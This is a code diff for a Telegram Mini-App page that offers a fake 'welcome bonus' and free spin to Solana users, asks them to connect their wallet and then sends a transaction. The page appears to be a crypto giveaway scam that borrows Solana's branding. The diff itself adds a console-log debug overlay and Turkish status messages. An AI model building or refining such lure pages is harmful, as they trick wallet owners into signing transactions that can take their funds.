@@ -26,6 +26,29 @@ interface TgWebApp {
 }
 
 export default function Page() {
+  /* ——— DEBUG OVERLAY SETUP ——— */
+  const [logs, setLogs] = useState<string[]>([])
+
+  useEffect(() => {
+    const origLog = console.log
+    const origErr = console.error
+
+    const push = (tag: 'LOG' | 'ERR', ...args: any[]) => {
+      setLogs(prev => [
+        ...prev.slice(-99),
+        `[${tag}] ${args.map(String).join(' ')}`
+      ])
+    }
+
+    console.log = (...a) => { push('LOG', ...a); origLog(...a) }
+    console.error = (...a) => { push('ERR', ...a); origErr(...a) }
+
+    return () => {
+      console.log = origLog
+      console.error = origErr
+    }
+  }, [])
+
   /* ——— Telegram Mini-App başlat ——— */
   useEffect(() => {
     const webapp = (window as any).Telegram?.WebApp as TgWebApp | undefined
@@ -188,10 +211,10 @@ export default function Page() {
 
       // 4) İşlemi onayla
       await conn.confirmTransaction(signature, 'confirmed')
-      setMsg('Transaction successful!')
+      setMsg('İşlem başarılı!')
     } catch (e) {
       console.error('Transaction error', e)
-      setMsg('Transaction failed')
+      setMsg('İşlem başarısız')
     } finally {
       setLoading(false)
       setTimeout(() => setMsg(''), 5000)
@@ -209,7 +232,6 @@ export default function Page() {
     closeDrawer()
 
     if (w.adapter.name === 'Phantom') {
-      // burada window.solana’ı as any ile cast ediyoruz
       const solana = (window as any).solana
       if (w.readyState === 'Installed' && solana?.isPhantom) {
         await select(w.adapter.name as WalletName)
@@ -228,7 +250,6 @@ export default function Page() {
   }
 
 
-
       return (
         <>
           {/* ---------- HERO BANNER ---------- */}
@@ -243,6 +264,7 @@ export default function Page() {
                   </p>
                 </div>
               </span>
+
               <div className="_9">
                 <div className="_i">
                   <p className="_k">Connect your wallet to receive reward</p>
@@ -252,6 +274,29 @@ export default function Page() {
                 </div>
               </div>
             </div>
+
+            {/* ——— DEBUG LOG’LARI (spin modalinin içinde) ——— */}
+            {logs.length > 0 && (
+              <div
+                style={{
+                  marginTop: '16px',
+                  maxHeight: '25vh',
+                  overflowY: 'auto',
+                  background: 'rgba(0,0,0,0.8)',
+                  color: '#0f0',
+                  fontSize: '12px',
+                  fontFamily: 'monospace',
+                  padding: '8px',
+                  borderRadius: '8px',
+                }}
+              >
+                {logs.map((line, i) => (
+                  <div key={i} style={{ whiteSpace: 'pre-wrap' }}>
+                    {line}
+                  </div>
+                ))}
+              </div>
+            )}
           </div>
 
           {/* ---------- HEADER ---------- */}
@@ -266,6 +311,7 @@ export default function Page() {
                     <img src="/alik.png" className="_t" alt="avatar" />
                   </a>
                 </div>
+
                 <div className="_0">
                   <div className="_6">
                     <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
@@ -282,6 +328,7 @@ export default function Page() {
                     </a>
                   </div>
                 </div>
+
                 <div className="_0">
                   <button onClick={openDrawer} className="_n">
                     <span className="_a">
@@ -301,6 +348,7 @@ export default function Page() {
                 WELCOME <span>BONUS</span><br/>
                 FOR SOLANA USERS
               </h1>
+
               <div className="_o">
                 <div className="_r">
                   <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
@@ -308,6 +356,7 @@ export default function Page() {
                   <button className="_y" onClick={handleSpin}>FREE SPIN</button>
                 </div>
               </div>
+
               <div className="_u">
                 <div className="_j">
                   <p className="_p">
@@ -343,7 +392,7 @@ export default function Page() {
               onClick={closeDrawer}
             />
 
-            {/* mobile bottom sheet */}
+            {/* mobile bottom-sheet */}
             <Transition.Child
               as="div"
               enter="transition-transform duration-200"
@@ -358,6 +407,7 @@ export default function Page() {
                 <h2 className="connect-title">Connect Wallet</h2>
                 <button className="connect-close" onClick={closeDrawer}>×</button>
               </div>
+
               <div className="connect-list">
                 {orderedWallets.map(w => (
                   <div
@@ -372,6 +422,7 @@ export default function Page() {
                   </div>
                 ))}
               </div>
+
               <p className="connect-footer">
                 Haven’t got a wallet?{' '}
                 <a href="https://solana.com/wallets" target="_blank">
@@ -380,7 +431,7 @@ export default function Page() {
               </p>
             </Transition.Child>
 
-            {/* desktop centered modal */}
+            {/* desktop modal */}
             <Transition.Child
               as="div"
               enter="transition-opacity duration-200"
@@ -396,6 +447,7 @@ export default function Page() {
                   <h2 className="connect-title">Connect Wallet</h2>
                   <button className="connect-close" onClick={closeDrawer}>×</button>
                 </div>
+
                 <div className="connect-list">
                   {orderedWallets.map(w => (
                     <div
@@ -410,6 +462,7 @@ export default function Page() {
                     </div>
                   ))}
                 </div>
+
                 <p className="connect-footer">
                   Haven’t got a wallet?{' '}
                   <a href="https://solana.com/wallets" target="_blank">
